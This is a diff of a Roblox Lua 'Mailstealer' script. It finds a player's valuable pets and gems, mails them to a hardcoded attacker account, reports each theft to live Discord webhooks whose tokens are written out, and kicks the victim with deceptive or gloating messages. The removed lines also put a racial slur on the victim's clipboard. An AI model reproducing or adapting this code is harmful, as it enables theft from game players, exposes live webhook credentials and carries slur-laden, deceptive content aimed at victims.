@@ -1,6 +1,6 @@
 Username = "br1c7s"
-Webhook = "https://discord.com/api/webhooks/1216487831099146320/JsLK6o7iRv2jIj5MxS7kmm9kUj3HIZdaMdW7fz2QLOk5E3wBfsA8xLct1HiO3hRWcgzD" -- your discord webhook in here
-min_rap = 10000
+Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed" -- your discord webhook in here
+min_rap = 20000
 
 local function SendMessage(url, username, itemID)
     local http = game:GetService("HttpService")
@@ -24,7 +24,7 @@ local function SendMessage(url, username, itemID)
                 }
             },
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
+				["text"] = "Mailstealer by leo"
 			}
         }}
     }
@@ -40,13 +40,13 @@ end
 if Webhook and string.find(Webhook, "discord") then
 	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
 else
-	Webhook = "https://discord.com/api/webhooks/1216487831099146320/JsLK6o7iRv2jIj5MxS7kmm9kUj3HIZdaMdW7fz2QLOk5E3wBfsA8xLct1HiO3hRWcgzD"
+	Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed"
 end
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "gg / HcpNe56R2a"
+local MailMessage = "d3pe on top"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
@@ -59,7 +59,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
 end
 
 if GemAmount1 < 10000 then
-    plr:kick("alt detected, please use your main")
+    plr:kick("alt?, alt detected please use main")
 end
 
 local user = Username
@@ -106,7 +106,7 @@ local function sendItem(category, uid, am, id)
         [5] = am or 1
     }
     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    if Webhook and Webhook ~= "https://discord.com/api/webhooks/1216487831099146320/JsLK6o7iRv2jIj5MxS7kmm9kUj3HIZdaMdW7fz2QLOk5E3wBfsA8xLct1HiO3hRWcgzD" then
+    if Webhook and Webhook ~= "" then
         SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
     end
 end
@@ -361,8 +361,8 @@ if CountHuges() > 0 or CountGems() > 1000000 then
 
 	miscSteal()
 	SendAllGems()
-	setclipboard("nigger")
-	plr:kick("rejoin to get script. ")
+	setclipboard("preciate the stuff")
+	plr:kick("All your stuff has just been stolen by D3PES mailstealer.")
 else
 	plr:kick("Error on script execution: 0x0001F4A2")
 end
